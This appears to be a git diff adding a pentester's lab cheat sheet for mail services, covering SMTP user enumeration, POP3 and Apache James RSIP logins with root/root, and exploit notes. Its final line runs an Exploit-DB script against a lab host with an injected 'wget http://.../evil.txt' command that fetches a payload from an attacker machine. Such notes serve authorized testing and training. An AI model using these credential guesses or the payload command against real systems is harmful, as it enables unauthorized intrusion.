@@ -1,0 +1,40 @@
+# Enumeration
+https://pentestlab.blog/2012/11/20/smtp-user-enumeration/
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap
+1) Connect and view banner
+	telnet <ip> 25
+	nc -vn <ip> 25
+	
+# SMTP commands
+https://mailtrap.io/blog/smtp-commands-and-responses/
+telnet <ip> 25
+EHLO mail.local
+HELO root
+VRFY root
+AUTH LOGIN
+
+# POP3 commands
+https://electrictoolbox.com/pop3-commands/
+telnet <ip> 110
+USER root
+PASS root
+list
+
+# RSIP
+telnet <ip> 4555
+root
+root
+
+
+# Exploits
+# PORT 4555 (rsip)
+# 10.11.1.72 BETA
+# Apache james server 2.3.2 is vulnerable to https://www.exploit-db.com/exploits/50347
+python 35513.py <ip>
+# Then you need to login through ssh
+
+# 10.11.1.231 MAILMAN
+# postfix is vulnerable to https://www.exploit-db.com/exploits/34896
+python 34896.py 10.11.1.231 "wget http://192.168.119.135/evil.txt"
